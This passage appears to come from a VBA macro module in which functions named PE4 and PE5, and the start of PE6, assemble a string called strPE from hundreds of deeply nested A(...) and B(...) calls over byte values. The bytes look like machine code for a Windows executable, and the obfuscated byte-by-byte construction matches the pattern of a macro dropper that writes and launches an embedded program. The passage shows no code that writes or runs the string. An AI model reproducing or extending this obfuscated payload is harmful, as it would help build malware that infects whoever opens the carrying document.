    strPE = A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(A(B(A(A(B(A(strPE, 139), "D"), 168), 252), "G"), 208), 25), "PR"), 232), "j"), 135), 0), 0), "RP"), 220), 188), 152), "'"), 0), 255), 214), 131), "h"), 12), 235), "?"), 139), 207), 159), 31), 144), 235), "Q"), 15), 175), 13), 172), 200), "A"), 0), 247), 233), 193), 250), "1"), 161), 200), 11)
    strPE = A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(strPE, "m"), 0), 139), 202), "!"), 226), 31), 3), 209), 193), 226), 5), ";L"), 2), 24), 188), 193), "`"), 1), 0), 0), 139), "T"), 2), 28), 131), 210), 0), "RQ"), 232), 34), 16), "}"), 0), "RPWhn"), 213), "@"), 0), 255), 206), 131), "_"), 16), 131)
    strPE = A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(strPE, 195), 4), 131), 251), "$"), 15), 130), "%"), 255), 255), 255), 161), 224), "aA"), 0), 133), 192), "."), 132), 195), "]"), 0), 0), "h"), 168), 213), "2"), 0), "P"), 255), 21), "H"), 193), "H"), 169), 139), 248), 131), 196), 8), 213), 2), "uWh"), 140), 213), "@"), 0)
    strPE = A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(strPE, 220), 21), "Y"), 20), "@"), 0), 131), "q"), 4), "j"), 213), 255), 21), 174), 193), "@"), 217), "hl"), 213), "@"), 165), "W"), 255), 167), 128), "z@s"), 139), "d"), 128), 176), "@"), 0), 156), "g"), 8), 16), 246), 247), 246), "u"), 10), 161), 200), 11), "A"), 0), 18)
    strPE = A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(A(B(strPE, "h"), 24), 235), "F"), 131), 254), "iu"), 21), 139), 13), 159), 2), "A"), 184), 184), "d{"), 11), 212), 0), 193), 225), 5), 231), "l"), 246), 248), 235), ","), 161), 172), 2), "A"), 0), 15), "@"), 198), 216), "E"), 244), 31), "E"), 244), 220), 13), 26), "D@"), 0)
    strPE = A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(strPE, 220), "$"), 0), 194), 151), 0), 232), "d"), 134), 0), 0), 243), 188), 200), 11), 206), 0), 226), 224), 5), "1l"), 19), 24), "iU,"), 194), "@"), 0), 221), "]"), 216), 139), "Y"), 220), 139), "E"), 168), "(PVh`_@"), 0), "W"), 255), 211)
    strPE = A(B(A(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(strPE, 131), 196), 20), 217), 131), 254), "d|"), 137), "W"), 216), 21), "P"), 193), "@"), 0), 131), 196), 4), 161), 184), 11), "A"), 0), 133), 18), 15), 132), "a"), 1), 0), 0), "h"), 168), "5@"), 0), "P"), 255), 222), "H"), 193), "@"), 0), "N"), 187), 8), 137), "h"), 252)
    strPE = B(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(B(A(A(B(A(B(A(B(A(A(A(B(A(A(A(B(A(B(A(A(B(A(B(A(A(strPE, 133), 192), "u"), 22), "h+C@"), 0), 255), "+L`"), 19), "3"), 131), 196), 186), "j"), 1), 243), 21), "p"), 193), "@"), 0), "h"), 20), 213), "@"), 0), "ti"), 138), 128), 193), "@"), 0), 161), 172), 2), "A"), 0), 131), 196), 8), 133), "%"), 199), "d")
    strPE = B(A(B(A(B(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(strPE, 244), 0), 0), 0), 0), 15), 142), 5), 1), 0), "x"), 159), 246), 161), 200), 11), "A"), 232), 29), "L"), 6), 4), 139), 154), 6), "Q"), 141), 164), "Y"), 132), 255), 255), "R~~Ta"), 206), 0), 139), "="), 200), 11), "A"), 0), "j"), 0), "h"), 232), "x")

    PE4 = strPE
End Function

Private Function PE5() As String
   Dim strPE As String

    strPE = ""
    strPE = B(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(A(strPE, 0), 30), 139), "L"), 235), 28), 139), "T>"), 16), 139), "~"), 13), 20), 255), "M"), 211), 139), "Ld"), 8), 139), "\>"), 24), 137), "U"), 209), 139), "T>"), 12), 129), 213), 188), 1), 0), 0), 131), "E"), 212), "Y"), 210), 0), 5), "Q"), 232), 182), "/2")
    strPE = A(B(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(strPE, 0), 139), "M"), 189), "WP"), 209), 152), 5), 201), 1), 145), 0), "S"), 0), 211), 209), 193), "h"), 232), 3), 0), 0), 233), "P"), 232), "f"), 4), 0), 0), "R"), 139), "i"), 212), "P"), 139), "~"), 208), "+'"), 139), "E"), 220), 27), 194), 129), 195), 244), "^"), 0)
    strPE = A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(strPE, 0), 131), 208), 0), 138), 0), "h"), 232), "a"), 30), 0), "PS"), 232), 214), 133), "+"), 0), 139), "MKRP"), 139), "E"), 208), 5), ">"), 1), 0), 144), "j"), 169), 131), 209), 0), "h"), 232), 3), 0), 0), "QP"), 182), 34), 133), 0), 0), "R"), 139)
    strPE = A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(A(B(A(B(strPE, "T{"), 4), "P"), 139), 4), ">j?h@"), 12), 158), 0), "7,"), 232), 11), 181), 0), 0), "R"), 139), "U"), 252), 141), 141), "D"), 163), 255), 255), "=Qh"), 240), 212), "@"), 0), "R"), 255), 21), 128), 193), "@"), 0), "wE"), 244), 131), 196)
    strPE = A(B(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(A(B(strPE, "4@"), 139), 13), "!"), 2), "A"), 0), 159), "# ;"), 10), 137), 179), "r"), 149), 140), 253), 254), 255), 255), 171), "e"), 206), "P"), 255), 21), "P"), 193), "@<"), 188), 196), 4), "oE"), 8), 133), 192), "t"), 8), "j"), 1), 255), 21), "p"), 193), "@"), 0)
    strPE = A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(B(strPE, "_^["), 139), 229), "]"), 195), 144), 28), 144), 144), 144), "U"), 139), 236), 139), "E"), 8), 139), "M"), 12), 193), 139), "p"), 16), 139), "q"), 16), 139), "@"), 20), 139), "."), 20), ";"), 193), 127), 22), "|"), 4), 155), 236), "s"), 6), 131), 200), 255), 168), "]"), 195)
    strPE = A(B(A(B(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(B(A(B(strPE, ";"), 193), "|"), 14), 184), 4), ";"), 214), "v"), 8), 184), 1), 0), 194), 0), "^"), 220), 195), "-"), 192), "^]"), 195), 144), 144), 134), "U"), 172), 149), 139), "E"), 8), 139), "M"), 12), ";"), 139), "P"), 24), 139), "q"), 251), 139), 184), 28), 13), "I"), 28), ";"), 193)
    strPE = B(A(B(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(B(A(B(A(B(A(A(strPE, 127), 22), "|"), 4), ";"), 214), "s"), 6), "R"), 200), 255), "^]7;"), 143), 210), 14), "D"), 4), 141), 214), "v"), 8), 184), 1), 0), 0), 0), "H]"), 195), "."), 192), "^]"), 17), 212), 144), 244), "U"), 139), 236), 139), "M"), 8), "SVW|")
    strPE = B(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(A(B(strPE, "q"), 24), 139), "y"), 16), 139), "Au"), 139), "Q"), 20), "+"), 247), 27), 194), 139), "U"), 12), 139), "z"), 24), 139), "J"), 16), 139), 9), 20), "+"), 29), 139), "J"), 28), 27), 203), 215), 193), 127), 24), "|"), 4), ";"), 170), "s"), 221), "_^"), 131), 200), "%[")
    strPE = A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(A(A(B(A(A(A(B(strPE, "]"), 195), 161), 193), "|"), 178), 214), 4), ";"), 247), "v"), 10), "_^"), 184), "b"), 0), 0), 0), "[("), 198), "_^3G[]"), 195), 144), 144), 144), 239), 144), 144), 144), 150), 139), 236), 139), 251), "q"), 15), "M>VEP"), 8), 222)
    strPE = A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(B(strPE, "q"), 8), 139), 34), 12), 139), 244), 12), ";"), 193), 127), 22), "|#;"), 14), "s"), 6), 131), 200), ",^]"), 195), ";"), 193), "|"), 14), 218), "o;"), 214), "v"), 8), 184), 1), 0), 0), 191), "^]"), 195), "3"), 192), "^]"), 195), 144), 144), 144)
    strPE = B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(B(A(B(A(A(A(A(B(strPE, "U"), 139), 236), 131), 243), "@"), 157), "a~A"), 0), 139), "?"), 164), 11), "A"), 0), "S"), 139), 29), 192), 11), "A"), 0), 230), "W"), 139), "="), 196), 11), "A"), 0), "+"), 195), 27), 207), 139), 21), 232), 23), "A"), 4), 137), "E"), 200), 137), 239), 204), 223), "m")
    strPE = A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(strPE, 200), 139), "5d"), 193), "@"), 0), "Rh"), 236), 231), "@{"), 220), "D8"), 194), "@"), 0), 221), "]"), 200), 255), 214), 161), 21), 23), "9"), 0), "h"), 224), 19), "A"), 0), 225), "P"), 150), 205), 11), "A"), 0), "Ph"), 220), 231), "@"), 0), 255), 214), 139)
    strPE = B(A(A(A(A(A(B(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(strPE, 13), 0), "bB"), 127), 135), "q"), 23), "A"), 232), 139), 21), 168), 11), "A"), 0), "QbP"), 252), "VP"), 231), "@"), 235), 255), 214), 230), 197), 168), 11), "A"), 0), "3"), 142), "f"), 253), 244), 23), "A"), 0), "r"), 161), 240), 23), 169), 0), "PPQ")
    strPE = A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(strPE, "h"), 0), 231), "@"), 0), 255), 214), 139), 21), 228), 23), "A"), 0), 161), 240), 23), "A"), 0), 131), 196), "DRL"), 130), 161), 168), 11), "A"), 0), "z"), 233), 176), 230), 175), 0), 255), 214), 139), 13), 140), 2), "AR"), 161), 187), 23), "A"), 25), 139), 21)
    strPE = B(A(B(A(A(B(A(B(A(A(B(A(A(B(A(B(A(A(A(B(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(B(A(B(strPE, "]"), 11), "A"), 163), "Q9PR}X"), 230), 131), 0), 255), 128), 161), 24), 208), "@"), 0), "q"), 140), 168), 11), "A"), 200), "S"), 161), 240), 23), "A"), 0), "PPQh"), 8), 230), "@"), 0), 255), "W"), 185), "U"), 204), 139), "P"), 200), "RP")
    strPE = A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(B(A(B(A(A(A(strPE, 161), 240), 23), "A"), 0), "PP"), 132), 13), 168), 11), "A"), 19), "Q?"), 168), "&@"), 0), 242), 214), 15), 21), 172), 2), "A"), 19), "#"), 240), 23), "A"), 0), 6), 196), "MbP-"), 161), 200), "s"), 19), 0), 242), 244), "X"), 239), 215), 0), 255)
    strPE = A(B(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(A(B(A(B(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(strPE, 164), 139), 13), 184), 2), "A"), 0), 161), "w"), 239), 14), 212), 139), 140), 168), 11), "A"), 0), "Q"), 217), 213), 193), "h"), 8), "!@"), 0), "`"), 214), 161), "0"), 2), "A"), 0), 131), 196), "("), 133), 193), 160), "+"), 185), 204), 2), "A"), 0), "|"), 13), "#"), 2)
    strPE = A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(B(strPE, "A"), 0), 139), 181), 196), 2), "AZP"), 161), 240), "{"), 247), 0), "Rs"), 13), 159), 11), "A"), 0), 153), "PQh"), 239), 228), "@"), 0), 237), 214), 161), 135), 24), 161), 208), "$A"), 0), 133), 237), "C"), 25), "["), 21), 168), 11), 10), 0), 178)
    strPE = B(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(strPE, 161), 240), 23), "A"), 0), "P"), 199), "Rh`"), 228), "@ "), 255), 214), 131), 196), 20), 1), "Y"), 2), "R"), 0), 133), 192), "t"), 7), 161), 176), 2), "A"), 0), "X*"), 168), 11), "A"), 0), 254), 161), 240), 212), "A"), 0), 211), "PQh"), 16), ")")
    strPE = A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(B(strPE, "@"), 0), 255), 214), 131), "g"), 20), 139), "b"), 148), 2), "A"), 0), 161), 144), 2), "A"), 166), 139), 13), 203), 11), "A"), 0), "RP"), 161), 240), "yA"), 0), "P"), 152), "Qg"), 184), 227), "@"), 0), 243), 214), 221), "`"), 2), "A"), 0), 131), 196), 24), 214)
    strPE = B(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(strPE, 248), 12), 135), "%"), 158), 21), 164), 2), "A"), 0), 161), 160), 2), "A"), 0), 139), 175), 168), "YA"), 0), "RP"), 161), 240), 23), "A"), 220), "PPQhh"), 227), 175), 0), 255), 214), 131), 196), "d"), 131), 156), "`"), 2), "n"), 0), 2), "u%")
    strPE = A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(strPE, 139), 21), 164), 2), "A"), 0), 161), 160), 2), "A"), 0), 139), 213), 168), 11), "A"), 196), "RP"), 161), 240), 23), "A"), 0), 9), "PQh"), 24), "#@"), 0), 255), 214), 131), 243), 24), 139), 21), 156), 2), 6), 0), 161), 152), 2), "A"), 0), 139), 13)
    strPE = A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(strPE, 168), 11), 145), 0), "RP"), 161), 240), 23), "A"), 0), "PrQh"), 192), 226), "@"), 0), 255), 214), 221), "E"), 200), 220), 29), "0"), 236), "@"), 204), 131), 196), 223), 223), 224), 22), 196), "1"), 15), "5"), 206), 0), 0), 0), 221), 5), "("), 194), "@"), 199)
    strPE = B(A(B(A(A(B(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(strPE, 220), "u"), 19), 161), 240), 23), "A"), 1), 207), 21), "K"), 172), "A"), 209), 153), 236), 8), 221), "]"), 200), 219), 5), 172), 2), 255), 187), 220), "M"), 200), 220), 13), " "), 194), "="), 139), 221), 28), "$PP"), 11), "hhK@"), 0), 255), "n"), 223), "-")
    strPE = B(A(A(B(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(A(A(B(A(B(A(A(B(A(A(B(A(B(A(A(strPE, 144), 2), "A"), 0), "k"), 237), 23), "TD"), 131), 196), "/"), 220), "M"), 200), 221), 28), "$"), 156), "P"), 161), 237), 11), "A"), 0), 227), "W"), 8), 226), "@"), 142), 255), 214), 161), "<"), 2), "A"), 0), 131), 196), 24), "U"), 192), "~i"), 170), "-"), 160), 2), "A")
    strPE = A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(strPE, 0), 161), 136), 23), "A"), 0), 139), 13), 168), 11), "A"), 0), 131), 236), 8), 190), "MC"), 221), 28), 148), "PPQh"), 184), "V"), 216), 0), 255), 214), 137), 21), 3), 241), "A"), 0), 184), "="), 144), "SA"), 195), 161), 199), 2), "A"), 0), 139), 13)
    strPE = A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(B(A(B(A(A(strPE, 148), 2), "A"), 0), "B"), 215), 19), 34), 137), "U"), 208), 137), "E"), 212), 161), 240), 185), "^"), 0), 223), "m"), 226), 139), 13), 168), 11), "A"), 0), 131), 196), 16), 220), "M"), 200), 221), 28), "(PPQ.w"), 174), "{"), 0), 255), 214), 131), 196), 24)
    strPE = A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(B(A(A(strPE, 204), 202), "3"), 255), 137), "U"), 224), 137), "U1"), 137), "U"), 5), 137), "U"), 244), 137), 11), 232), 137), "U"), 236), 139), 21), 172), 2), "A"), 0), "3"), 24), 131), 201), 255), 184), 255), 255), "%"), 143), 133), 210), 168), 28), 208), 199), "E"), 216), 255), 255), 255), 255)
    strPE = A(A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(B(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(strPE, 129), "E"), 220), "3"), 142), "a"), 0), 0), 0), 139), 163), 200), 11), "A"), 0), 131), 194), 24), "dU"), 252), 139), 21), 218), 2), "A"), 0), "Fv"), 248), 138), 11), "V"), 139), "R"), 248), 137), "U"), 200), 139), "U"), 252), "+B"), 252), "|"), 21), 127), 210), 139)
    strPE = B(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(B(A(A(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(B(strPE, "U"), 200), ";"), 234), 139), "U"), 252), "K"), 9), "EE"), 200), 137), "Eu"), 139), "Bx"), 139), 10), 139), "R"), 166), "93"), 220), 137), 18), 196), "("), 13), 127), 5), "9M"), 224), "r"), 6), 137), "M"), 216), 137), "U"), 220), 139), "U"), 252), 139), "R7")
    strPE = B(A(A(A(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(A(B(strPE, "9U"), 244), 137), "U"), 204), 127), 22), "|"), 8), 139), "U"), 240), 209), "U"), 200), "Q"), 12), 127), "U"), 200), 137), "U"), 240), 139), "Uw"), 137), 28), "M"), 139), 230), 196), "9"), 127), 244), 227), 13), "|"), 5), "9M"), 232), "w"), 6), 137), 241), 232), 137), "U")
    strPE = A(A(B(A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(A(B(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(B(strPE, "5F"), 24), 200), 3), 250), 139), "U"), 204), 19), "`"), 139), "U"), 224), 3), 209), 139), "Mi"), 137), "U"), 235), 139), "U"), 161), 188), "IE"), 19), "Z"), 240), "M"), 134), 137), "Ut"), 15), "Uj"), 131), 194), 152), 134), 137), "M"), 248), 139), "M"), 208), 137)
    strPE = A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(B(strPE, "U"), 252), 15), 133), "N"), 255), 255), 255), 141), 193), 244), 1), 0), 0), "j"), 232), 131), 227), 0), "h"), 232), 3), 0), 0), 136), "4"), 232), "%8"), 0), 0), 139), "M"), 220), 137), "E"), 208), 139), "E"), 216), "j"), 176), 5), 244), 1), 0), 0), "h"), 232), 3)
    strPE = A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(A(strPE, 0), 0), 13), 22), 0), 137), "U"), 212), "QP"), 232), 3), 127), 0), 0), "qA"), 127), 137), "E"), 216), 139), "E"), 240), "!"), 154), 5), 244), 1), 18), 127), "h"), 232), 3), 0), 11), 131), 216), 0), 12), "UpQP"), 232), 225), "~"), 12), 142), 139)
    strPE = B(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(B(strPE, "M"), 236), 137), "EJ"), 139), "E"), 232), "j"), 0), 5), 244), 1), 0), 166), "h"), 158), 3), "!"), 0), 131), 167), 0), "2U"), 244), "Q"), 161), 232), 191), 1), "F"), 0), 129), 199), 244), 1), 30), 0), ";"), 220), 131), "^"), 0), "h"), 232), 3), 0), 25), "S")
    strPE = A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(B(strPE, "W"), 137), "E"), 232), 137), "U"), 19), 232), "L~"), 0), 0), 139), "M"), 228), 8), 216), 139), "E"), 224), "j"), 0), 5), 244), 214), 0), 0), 215), 232), 3), 0), 0), 131), 209), 0), 137), "U"), 204), "Q"), 199), 232), 129), 220), 0), 0), 137), "E"), 224), 161), 172)
    strPE = B(A(B(A(B(A(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(strPE, 2), "A"), 0), 133), 192), 137), "U"), 228), 15), 142), "*"), 1), 0), 0), 139), 146), 240), 23), "A"), 0), 161), 168), 11), "A"), 0), "RPh,"), 225), "@"), 0), 255), 214), 161), 240), 23), "A"), 0), 139), 13), "6"), 11), "v"), 136), "PPAPQ")
    strPE = B(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(B(strPE, "h"), 216), 224), "@"), 150), 255), 214), 139), "Uo"), 139), "E"), 240), 139), "="), 240), 23), "A"), 0), 131), 196), "$"), 139), "M"), 132), "RP"), 161), 172), 243), "A"), 0), "W"), 153), "RPQSI"), 31), "~G"), 0), 139), 13), 168), 11), "A"), 0), "|")
    strPE = A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(B(A(strPE, 139), "U"), 212), "P"), 139), "E"), 208), "WRPW[Qh"), 128), 169), "@"), 0), 255), 214), 161), 172), 2), "A{"), 139), "M"), 240), "L"), 191), 248), 139), "E"), 232), 219), 196), "0"), 189), 193), 139), "3"), 236), 137), "U"), 196), 27), "M"), 244), "Q"), 139)
    strPE = A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(A(B(A(B(A(B(A(B(A(A(A(B(A(B(strPE, "M"), 228), "P"), 233), 240), 23), "A"), 176), "PR"), 139), "U"), 224), "WQR"), 232), 209), "}"), 0), 0), "_"), 202), 139), "U"), 196), "R"), 139), "U"), 204), "WR7"), 141), 18), 244), 137), "M"), 252), 232), 186), "}"), 0), 0), 139), "M?+"), 200), 139)
    strPE = A(B(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(B(strPE, "E"), 252), 7), 194), "P"), 161), 240), 23), "Z"), 0), "Q"), 139), "]"), 216), 139), 235), 208), 139), 200), 212), 139), 203), "+"), 202), 139), "U"), 220), 27), 215), "PsQPPh"), 168), 11), "A"), 0), "Ph"), 14), 224), "@"), 0), 255), 214), 139), "M"), 236)
    strPE = B(A(B(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(strPE, 139), 220), 241), 161), 172), 2), "A"), 0), 139), "="), 253), 23), "A"), 0), 131), 196), "0Q"), 139), 7), 224), "RW"), 31), "RP"), 139), 127), 178), "P"), 190), "q^}"), 0), 0), "R"), 139), "U"), 220), 168), 161), 168), 11), "A"), 232), "WRSW")
    strPE = B(A(A(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(B(A(A(B(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(B(A(A(B(strPE, "WPh"), 200), 223), "@"), 0), 255), 214), " "), 196), "0h"), 184), 11), "@"), 0), ";"), 214), 131), 246), 4), "_^["), 139), 229), "]"), 173), 144), 8), 229), "U"), 139), "3"), 131), ","), 20), 161), 168), 2), "A"), 0), 139), 158), 16), 208), "d6S")
    strPE = A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(B(strPE, "V;"), 193), "W"), 15), 141), 254), 1), "c"), 0), 139), "|"), 214), "3"), 219), 139), 6), 137), "^"), 239), 147), 195), 137), "^"), 16), 17), 158), "$"), 8), 168), 0), 137), 158), 34), 34), 0), 228), 137), 158), "("), 8), "Y"), 165), 137), "^"), 20), "t"), 8), 219), 232)
    strPE = B(A(B(A(B(A(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(B(strPE, "8"), 20), "!"), 0), 235), 15), 139), 13), "2@"), 140), 0), "SSQVl"), 167), 171), 0), 0), 139), 129), 161), 170), 23), "A"), 0), 207), "S"), 139), "H"), 221), 141), "~"), 4), "j"), 1), "QW"), 232), 31), "J"), 0), 0), ";"), 195), "t"), 14), "P")
    strPE = A(B(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(B(A(A(A(A(B(strPE, "z8"), 232), 16), 0), 232), "`"), 229), "QG"), 209), 196), "R"), 139), 172), "0"), 1), "j"), 8), "R"), 232), "ET"), 0), 0), ";"), 195), "t"), 14), 205), "h("), 232), "@v"), 232), "B"), 229), 255), 255), 131), 196), 8), "@l"), 2), "Ax;"), 195)
    strPE = A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(B(A(B(A(A(B(A(B(A(A(A(A(B(strPE, "tQ"), 254), 139), 7), 215), "@P"), 232), "/T"), 0), 0), ";"), 195), "t"), 171), "="), 135), 7), 1), "st"), 174), "Ph"), 20), "["), 127), 0), 232), 21), 229), 255), 4), 131), 196), 8), 164), 13), "l"), 139), "A"), 0), 139), 23), "QhL"), 0)
    strPE = A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(B(A(A(B(A(A(A(A(strPE, 0), 0), 135), 176), "nT"), 0), 0), ";"), 195), "t"), 21), "="), 135), "2"), 1), 0), "t"), 14), "Ph"), 252), "L@"), 133), 232), 232), 228), 255), 255), 131), 196), 185), 232), 160), "0"), 0), 0), 163), 160), 11), "A"), 188), 137), 21), 164), 11), "A"), 0), 139)

    PE5 = strPE
End Function

Private Function PE6() As String
   Dim strPE As String

    strPE = ""
